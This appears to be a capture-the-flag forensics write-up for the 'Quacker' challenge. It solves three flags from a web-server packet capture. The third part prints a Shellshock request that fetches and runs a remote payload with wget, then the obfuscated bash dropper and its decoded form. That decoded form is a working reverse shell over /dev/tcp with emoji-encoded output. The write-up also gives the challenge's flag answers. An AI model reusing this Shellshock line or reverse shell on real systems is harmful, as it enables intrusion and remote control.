# Quacker

## Challenge description

**Author: Thhethssmuz**

**Difficulty: challenging/hard**

**Category: forensics**

**Description Norwegion**:
> Etter oppkjøpet av det sosiale medieselskapet Quacker befant Skrue McDuck seg blant annet midt i en sikkerhetshendelse. Kan du hjelpe ham med å finne ut hva som skjedde med quacker.com?

**Description English**:
> After his acquisition of social media company Quacker, Inc. Scrooge McDuck found himself, amongst other things, in the midst of a security incident. Can you help him figure out what happened to quacker.com?

This write-up is in English, however, the challenges themself as well as the flags are in Norwegian.

### 1

> The Quacker duck has a unusual job description, but what is it?

You can find this in the metadata of the quacker logo or `logo.png`. However, I predict this is going to be the easiest part of this challenge, as this can also be found just by calling `strings` on the pcap it self:

```sh
strings quacker.pcap | grep TG23
```

Solution: `TG23{kvakksalve}`

### 2

> Dully Duck uses a strange browser, can you figure out what it is?

This should be relatively easy, despite there being about 280 flows in the pcap file, dolly duck is quite active and simply stepping through the flows you should be able to find one with a `Cookie` header `session=dolly:07061940`. Then you will also find the `User-Agent` header `VEcyM3tpZTZmdHd9Cg==`.

If you are really sneaky you can technically also find this using `strings`, but you need to base64 encode it first, however, having a predefined flag convention makes this relatively easy and perhaps something someone might actually try :/

```sh
strings quacker.pcap | grep "$(echo "TG23" | base64 | cut -c 1-4)"
```

Solution: `TG23{ie6ftw}`

### 3

> What is hidden in the file `hemmelig.txt`?

This is not easy, however, this is a pcap from a web-server so all requests should be directed to it, so when you find a request coming from the server some red flags should start going off. If you work your way back you should be able to find this suspicious request:

```
GET / HTTP/1.1
Host: quacker.com
User-Agent: () { :; }; wget -O /tmp/meh http://2023-nyheter.vg:8088/meh;chmod 777 /tmp/meh;/tmp/meh;
Accept: */*
```

For those who hasn't seen this before, this is an exploit attempt for the Shellshock family of vulnerabilities. And despite being an exploit from 2014 the server is quite vulnerable.

Next up we see the web-server make a request to a dubious looking domain:

```
GET /meh HTTP/1.1
Host: 2023-nyheter.vg:8088
User-Agent: Wget/1.21.3
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
```

And being served a nasty looking shell script:

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.6.5
Date: Sun, 02 Apr 2023 19:59:16 GMT
Content-type: application/octet-stream
Content-Length: 3615
Last-Modified: Sun, 02 Apr 2023 08:35:32 GMT

#!/bin/bash

                                                         J=w;
                                                          L=p;
                                                           O=_;
S=c;      AI=Y;          AK=Z;               AL=D;          T=B;     AM=j;
U=A;   b=0; V=m;       N=1; W=M;          AO=u;  X=i;       Y=P;   y=6; Z=H;
c=W;  AP=^;   d=S;   AR=-;    e=/;      AS=L;      f=l;     g=O;  AU=q;   h=z;
q=8; AV=V;     B=T; AX=N;      i=s;   AY=F;          j=G;   C=v; Ac=h;     l=f;
Aj=\(;          Am=\';         o=%;  Ad=o;            p=R;  Ap=\;;         t=x;
Ab=\>;          Ae=\.;         u=X;  v=e;       Af=E;  D=t; Ag=\\;         w=U;
AW=\<;          AZ=\|;         x=r;  Ah=I;     F=g; Ak=K;   Aa=\);         z=a;
Al=C;           Aq=n;          AJ=2;  K='=';                AA=\};         AE=3;
AT=4;           Ao=5;          An=7;   AH=\";       Ai=9;   A=\~;          E=\[;
H=\&;           M=\ ;          P=\+;     AN=\,;  Q=\$;      R=\@;          a=\{;
k=\#;           m=\`;          n=\?;       G=Q; I=:;        r=\*;          s=\!;
AB=y;           AC=d;          AD=b;         AQ=\];         AF=J;          AG=k;

$v$C$z$f$M$v$S$Ac$Ad$M$Ah$AB$Af$C$AI$V$f$AO$AS$AJ$AF$Ac$S$AJ$F$Ak$AI$X$F$L$Ah$Z\
$i$F$AC$AJ$Ac$L$AD$j$w$F$S$V$AV$Ac$AK$Al$U$D$S$X$T$Ac$g$AJ$p$C$Ah$Z$AC$Ad$z$c$t\
$f$Ah$Af$f$j$w$h$b$F$S$V$AV$Ac$AK$Al$U$D$S$X$U$D$AD$AM$Af$F$AI$AM$D$AG$AD$AB$T$\
AB$AK$c$AY$AG$Ah$Al$N$AB$Ah$Al$N$AO$W$d$T$AM$Ah$AL$J$F$Y$Al$Ac$X$AI$u$AX$f$AX$A\
M$G$F$AS$AJ$p$f$AC$X$Ai$N$S$V$AY$AO$AK$j$Ai$D$Ak$B$D$AM$Y$d$Ah$AG$Ak$Z$T$AB$z$c\
$Ao$b$AK$X$U$X$AF$c$G$X$Ah$Al$Ah$Aq$AF$j$W$X$Ak$d$Ah$An$AI$AM$b$X$AF$Al$Ac$J$S$\
V$f$AO$AC$j$AI$F$Ah$X$AV$AG$Ah$X$U$X$AF$AB$p$X$Ah$X$AG$X$g$AE$T$AB$z$c$Ao$b$AK$\
X$U$X$AF$B$U$AB$v$Al$Ah$F$Ah$X$p$AM$Ah$AM$D$J$S$V$f$AO$AC$j$AI$F$Ah$X$w$J$W$Aq$\
F$X$Ah$Al$Ah$AG$Ak$Al$Ac$X$u$V$W$L$Ak$d$Ah$An$AK$j$Ai$AO$AK$B$J$q$Y$Al$Ah$AG$AI\
$d$AF$q$AD$AJ$G$F$AS$u$p$AT$W$d$U$D$G$c$Ao$q$AC$Z$Ah$F$AS$c$G$F$AF$AB$T$S$AD$X$\
AC$q$AC$AJ$Ac$L$AD$j$w$F$S$V$AV$Ac$AK$Al$U$D$S$X$U$D$AD$AM$Af$F$AI$B$D$AG$AD$AB\
$T$J$S$V$f$AO$AC$j$AI$F$Ah$f$t$AT$AK$AM$T$S$v$AL$f$V$u$Z$F$Ao$g$AY$t$AT$g$Al$p$\
An$AI$u$b$X$g$AJ$p$C$AD$V$w$An$AK$c$AX$Ad$AD$h$D$AG$AD$AJ$Ao$f$Ah$Z$b$Ak$AI$AB$\
F$L$Ah$Z$i$F$AC$AJ$Ac$L$AD$j$w$F$AD$c$AY$J$AK$V$f$i$AK$d$U$D$AC$Al$U$D$AD$AM$W$\
b$Ah$j$Af$F$AF$X$AI$F$Ak$Al$F$AG$v$AB$AX$Ac$c$b$T$AC$l$d$AG$L$g$AJ$p$C$Ah$Z$p$A\
B$Ah$Al$N$AG$Ah$Al$S$F$u$j$AT$Aq$Y$AL$J$q$Ah$X$p$An$AI$AV$D$U$u$u$b$X$l$j$Ai$AG\
$Ah$Al$N$b$v$AL$Af$F$AS$w$AY$AO$l$Z$AX$f$AK$Al$U$Aq$S$AB$Ai$AD$W$Al$b$Ao$AI$d$N\
$V$u$AV$i$J$W$B$G$N$g$AL$f$AM$AK$AY$b$C$W$Al$Ai$Aq$AF$AE$t$h$AK$c$G$F$AF$AE$W$C\
$c$h$U$D$g$c$Af$D$AK$f$N$AD$W$AM$W$AJ$AX$AJ$AY$X$AK$c$AK$AC$AS$h$Af$C$AK$AB$AC$\
q$AC$Z$Ah$F$AS$c$G$F$AF$AB$T$S$AD$X$AC$q$AK$V$Ai$i$AK$Al$U$D$AI$AM$Ac$q$AK$AE$A\
F$f$S$Al$U$D$AC$X$U$Aq$u$AM$T$S$Ak$AB$G$Aq$l$Z$AC$Ad$z$c$t$f$Ah$Z$AF$f$AI$c$G$F\
$AS$u$Ah$F$AI$B$D$AG$AD$AB$T$J$S$V$f$AO$AC$j$AI$F$AF$AB$AV$X$AF$AB$U$X$AF$Al$Ac\
$J$S$V$f$AO$AC$j$AI$F$AF$N$t$S$AF$B$U$h$AD$AB$S$F$Ah$X$G$Ad$Ak$AL$Ah$AM$AF$j$Af\
$L$Ak$d$Ah$L$Ah$AM$D$AG$AD$AJ$Ao$f$g$AJ$AV$AM$z$j$q$An$AK$j$Ai$AO$AK$d$T$Ai$Al$\
V$f$V$Ah$Al$Af$Ad$S$V$AV$b$AC$u$AF$AO$Ah$AL$U$F$W$AM$AT$C$AK$j$AV$AJ$AS$AJ$Ao$N\
$AD$j$J$L$g$AE$p$Ad$AK$c$AT$Ak$Ah$Al$T$f$v$j$AV$AM$Ah$AL$S$q$Y$X$Ai$AG$AK$u$AI$\
C$AC$j$AX$J$AS$h$Ah$J$W$AM$W$D$AD$Aq$f$Ad$AK$u$p$f$S$X$Ao$AJ$AK$AB$q$t$W$h$W$AE\
$Al$X$U$F$AC$AJ$Ac$L$AD$j$w$F$S$V$AV$Ac$AK$Al$U$D$S$X$T$Ac$g$AJ$p$C$Ah$j$AV$AJ$\
AI$c$J$F$Ah$X$p$Ac$Ah$X$U$AB$Y$X$AI$t$g$AJ$p$C$AD$V$w$q$Ah$AL$J$Ad$AI$AB$U$J$Y$\
Al$AI$AE$Ak$u$t$X$Ah$AL$AT$V$AX$J$L$V$z$G$Ad$K$AZ$AD$z$i$v$y$AT$M$AR$AC$AZ$v$C$\
z$f$M$AH$Q$Aj$S$z$D$Aa$AH
```

Then follows a new request from the server to the same IP with a very peculiar transaction:

```
>                ,.. :!:::!::!:!!,,
>            .z$&&&& !::!::!:!::!!!!:!.
>          c$&$$&$$$ !!!!!!!!!!!!!!!!!!!!
>        d$$$$$$$$$$!`!!!!!!!!!!!!!!!!!!!!
>       !!,=$$$$$$$$$ !!!!!!!!!!!!!!!!!!!!!
>      !!!!!,=$$$$$$$ !!!!!!!!!!!!!!!!!!!!
>     !!!!!!!!,=$$$$$d !!`````````!!!!!!!`
>     `!!!!!!!!!`$$P= , !````<<<<<<!,  ``
>       `!!!!!!!! ==,,,----=--,,``<<<<<<!
>         `!!!``,-`` ,!!!!!!!!!!``- `<<<<!      ,!!,
>           `,-`,!!!!!!!!!!`  ,, `!!,      ,!!!!!!!!!
>         ,-`,!!!!!!!!!!!` dMMMMMMx !!!!!` ,`!!!!!!!!
>       ,`,!!!!!!!!!!!!! dMMMMMMMMMM ``` IMMM `!!!!!
>     ,`,!!!!!!!!!!!` , MMP`,eee =MMM Md MMMMM `!!!
>    ! !!!!!!!!!!!` mM MM`,$$$$$$d =Md4M,M e,`1 !`
>   ! !!!!!!!!!!! xMMMMM`I$$$$$$$$d )MMMMM,`$$,
>  ` !!!`!!!!!!! dMMMMM`I$$$$$$$$$$T MMMMMM $$$,
>    !! <`!!!!! IMMMMM`,$$$$$$$$$$$P MMMMMM $$$$
>   `!!!`de,,, ,edMMMM $$$$$$$$$$$$T MMMMMM $$$$  ,
>    ` ,mMMMMMMMMTMMMM P==1$$$$$$$$=,MTT4MM 1$$T!P==1x-
>    ,d)MMMMMMP`dMMMMM      $$$$$$P  ,eDe,    $   eDe L-
>     ,MMMMMMM ,e, 4MMi      $$$$$  ,DDDD<   4   DDD< L=
>     P)MMMMM< $$1$ =MM      $$$$=  DDDDD`   ,,  DD< % `
>    ` MMMTMMM `d $$e,1d     $$$=   `DDD`-==---,,,,,--
>      M=       `1, 11$e,,,,,,ee$4= -,ee$$$$PP=====11$$$$
>      =          `=d,- =1$$$$$$$$$$P==`,, ,d=
>                    `1$d `,,,,,,,`!!!!!!`i=
>                     m 1$e`!!!!!!!``,!!! T
>                ,!- !MM =$d !!!!!,,!!!`i=
>            ,!!!!!  MMMM,`1$e,-`` -,,ed`
>           !!!!!!!! MMMMMMm, `=====``
>        ,  !!!!!!!!!, `=TT`!!!!!<
>    ,!!!!< !!!!!!!!!!!!!   ` !!!!!!!!
>
< 😃😄😃😂😃😆😆😄😃😄😆😂😃😃😆😆😃😃😃😄😃😅😃😉😃😇😃😀😃😀😃😀😃😅😃😇😃😇😃😈😃😅😃😉😃😃😃😄😃😇😆😁😃😁😆😆😃😆😃😈😃😀😃😀😃😅😃😀😃😆😆😁😃😆😃😂😃😄😃😂😃😇😃😈😃😁😃😄😃😆😃😇😃😀😆😅😃😆😃😈😃😀😃😆😃😃😃😀😃😅😃😅😃😄😃😁😃😆😃😁😃😄😆😂😃😇😆😅😃😅😃😅😃😆😃😁😃😄😃😄😃😇😆😅😃😇😃😀😃😅😃😀😃😆😃😆😃😁😃😁😃😇😆😁😃😁😃😂😃😄😃😃😃😂😆😃😃😃😃😁😃😅😆😃😃😆😆😅😃😀😆😆😃😃😃😇😃😅😆😅😃😅😃😈😃😆😃😂😃😇😃😄😃😅😃😄😃😆😆😁😃😀😃😉😃😄😆😅😃😂😃😁😃😆😃😆😃😀😆😂😃😄😆😁😃😂😃😇😃😅😃😇😃😃😃😆😃😇😃😅😃😁😆😂😃😄😆😂😃😂😆😆😃😂😆😆😃😀😆😆😃😅😃😀😃😃😆😅😃😆😃😃😃😀😆😃😃😃😃😀😃😄😃😄😃😄😆😁😃😆😆😁😃😄😆😆😃😂😃😉😃😃😃😂😃😅😆😄😃😇😃😇😃😀😃😂😃😄😆😂😃😂😃😅😃😅😃😂😃😃😃😆😃😆😆😂😃😆😆😂
>                ,.. :!:::!::!:!!,,
>            .z$&&&& !::!!!!:!::!::!:!.
>          c$&$$&$$$ !!!!!!!!!!!!!!!!!!!!
>        d$$$$$$$$$$!`!!!!!!!!!!!!!!!!!!!!
>       !!,=$$$$$$$$$ !!!!!!!!!!!!!!!!!!!!!
>      !!!!!,=$$$$$$$ !!!!!!!!!!!!!!!!!!!!
>     !!!!!!!!,=$$$$$d !!`````````!!!!!!!`
>     `!!!!!!!!!`$$P= , !````<<<<<<!,  ``
>       `!!!!!!!! ==,,,----=--,,``<<<<<<!
>         `!!!``,-`` ,!!!!!!!!!!``- `<<<<!      ,!!,
>           `,-`,!!!!!!!!!!`  ,, `!!,      ,!!!!!!!!!
>         ,-`,!!!!!!!!!!!` dMMMMMMx !!!!!` ,`!!!!!!!!
>       ,`,!!!!!!!!!!!!! dMMMMMMMMMM ``` IMMM `!!!!!
>     ,`,!!!!!!!!!!!` , MMP`,eee =MMM Md MMMMM `!!!
>    ! !!!!!!!!!!!` mM MM`,$$$$$$d =Md4M,M e,`1 !`
>   ! !!!!!!!!!!! xMMMMM`I$$$$$$$$d )MMMMM,`$$,
>  ` !!!`!!!!!!! dMMMMM`I$$$$$$$$$$T MMMMMM $$$,
>    !! <`!!!!! IMMMMM`,$$$$$$$$$$$P MMMMMM $$$$
>   `!!!`de,,, ,edMMMM $$$$$$$$$$$$T MMMMMM $$$$  ,
>    ` ,mMMMMMMMMTMMMM P==1$$$$$$$$=,MTT4MM 1$$T!P==1x-
>    ,d)MMMMMMP`dMMMMM      $$$$$$P  ,eDe,    $   eDe L-
>     ,MMMMMMM ,e, 4MMi      $$$$$  ,DDDD<   4   DDD< L=
>     P)MMMMM< $$1$ =MM      $$$$=  DDDDD`   ,,  DD< % `
>    ` MMMTMMM `d $$e,1d     $$$=   `DDD`-==---,,,,,--
>      M=       `1, 11$e,,,,,,ee$4= -,ee$$$$PP=====11$$$$
>      =          `=d,- =1$$$$$$$$$$P==`,, ,d=
>                    `1$d `,,,,,,,`!!!!!!`i=
>                     m 1$e`!!!!!!!``,!!! T
>                ,!- !MM =$d !!!!!,,!!!`i=
>            ,!!!!!  MMMM,`1$e,-`` -,,ed`
>           !!!!!!!! MMMMMMm, `=====``
>        ,  !!!!!!!!!, `=TT`!!!!!<
>    ,!!!!< !!!!!!!!!!!!!   ` !!!!!!!!
>
< 😃😆😃😃😃😁😃😁😃😅😃😂😃😃😆😄😃😇😃😆😃😁😃😉😃😇😃😉😃😀😆😄😃😆😆😃😃😆😆😃

...
```

To solve this you will have to deobfuscate the shell script. However, despite how nasty it looks it isn't actually that bad. If you replace all the shell variables you will find this:

```shell
echo IyEvYmluL2Jhc2gKYigpIHsgd2hpbGUgcmVhZCAtciBhO2RvIHdoaWxlIElGUz0gcmVhZCAtciAtbjEgYjtkbyByZWFkIC1yIC1uMSBjIDwgPChiYXNlNjQgL2Rldi91cmFuZG9tKTtjPSIkKHByaW50ZiAiJWQiICInJGMiKSI7Yj0iJChwcmludGYgIiVkIiAiJyRiIikiO3ByaW50ZiAiJTAyeCIgIiRjIjtwcmludGYgIiUwMngiICIkKChiXmMpKSI7ZG9uZTw8PCIkYSJ8b2QgLXR4MSAtQW58dHIgLWQgJyBcbid8d2hpbGUgcmVhZCAtciAtbjEgYTtkbyBwcmludGYgIlx4ZjBceDlmXHg5OFx4OCR7YX0iO2RvbmU7ZWNobztkb25lIH0KYygpIHsgd2hpbGUgbWFwZmlsZSAtdCAtbjM0IGEgJiYgKCgkeyNhW0BdfSkpO2RvIHRyIC1kICcgXG4nPDw8IiR7YVtAXX0ifG9kIC10eDEgLUFufHNlZCAncy9bMC05YS1mXVswMTQ1ODljZF0vMC9nJ3xzZWQgJ3MvWzAtOWEtZl1bMjM2N2FiZWZdLzEvZyd8dHIgLWQgJyBcbid8Zm9sZCAtYjh8Z3JlcCAtdiAnXjBcKyQnfHdoaWxlIHJlYWQgLXIgYTtkbyBwcmludGYgJyViJyAiJChwcmludGYgJ1xcJTAzbycgIiQoKDIjJGEpKSIpIjtkb25lO2VjaG87ZG9uZSB9CmlmICEocmV0dXJuIDAgMj4vZGV2L251bGwpO3RoZW4KICBleGVjIDc8Pi9kZXYvdGNwLzIwMjMtbnloZXRlci52Zy8xMzM3CiAgd2hpbGUgcmVhZCAtciBhO2RvIGV2YWwgIiRhIiAyPiYxO2RvbmU8IDwoYyAwPCY3KXxiID4mNwpmaQo=|base64 -d|eval "$(cat)"
```

And when you decode the base64 blob you'll get the following script:

```sh
#!/bin/bash
b() { while read -r a;do while IFS= read -r -n1 b;do read -r -n1 c < <(base64 /dev/urandom);c="$(printf "%d" "'$c")";b="$(printf "%d" "'$b")";printf "%02x" "$c";printf "%02x" "$((b^c))";done<<<"$a"|od -tx1 -An|tr -d ' \n'|while read -r -n1 a;do printf "\xf0\x9f\x98\x8${a}";done;echo;done }
c() { while mapfile -t -n34 a && ((${#a[@]}));do tr -d ' \n'<<<"${a[@]}"|od -tx1 -An|sed 's/[0-9a-f][014589cd]/0/g'|sed 's/[0-9a-f][2367abef]/1/g'|tr -d ' \n'|fold -b8|grep -v '^0\+$'|while read -r a;do printf '%b' "$(printf '\\%03o' "$((2#$a))")";done;echo;done }
if !(return 0 2>/dev/null);then
  exec 7<>/dev/tcp/2023-nyheter.vg/1337
  while read -r a;do eval "$a" 2>&1;done< <(c 0<&7)|b >&7
fi
```

For those who don't know their bash this is a reverse shell. The important part to understand is that all messages from the attacker is passed through the function `c` before being passed to `eval`, then the output is passed through the function `b` before being transmitted back to the attacker.

This means that we already have a function (`c`) to decode all the messages from the attacker to the victim, and if we do that we get:

```
whomai
whoami
env
ls
cat hemmelig.txt
```

However, the ofuscation is not symmetrical, so to decode the traffic in the other direction we will have to reverse the function `b`. I will leave the particulars as an exercise for the reader, but in short the last 4 bits in each emoji contains a byte stream that can be reassembled. Once we do this we will find:

```
/tmp/meh: line 54: whomai: command not found
root
DB_PASSWORD=kvakkvarakvakkvakk
HOSTNAME=ba521101f401
DB_HOSTNAME=mysql01.quacker.com
PWD=/opt/www
HOME=/root
SHLVL=1
SERVER_PORT=80
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
hemmelig.txt
node_modules
package-lock.json
package.json
server.js
static
templates
TG23{andemoji}
```

Solution: `TG23{andemoji}`
